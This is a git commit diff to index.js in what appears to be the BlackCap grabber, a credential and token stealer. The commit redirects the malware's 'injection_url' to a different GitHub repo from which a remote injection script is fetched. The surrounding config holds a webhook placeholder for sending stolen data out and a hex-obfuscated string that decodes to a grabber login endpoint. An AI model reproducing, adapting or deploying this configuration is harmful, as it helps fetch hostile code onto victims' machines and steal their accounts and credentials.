52332b6b31c59e6cd03c22298ab6b53be1cb9857
RndmAcc123 <124072694+RndmAcc123@users.noreply.github.com>
2023-02-25 12:22:54 +0100

    Update index.js

--- index.js
+++ index.js
@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/RndmAcc123/fgtrdfjhknbgfgdubhizgnr7zh85654e67hz8fdfcnz7vgr7hnzt547hbgrfh76znvbr76ht45h67/main/index.js",
     webhook: "%WEBHOOK%",
     uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
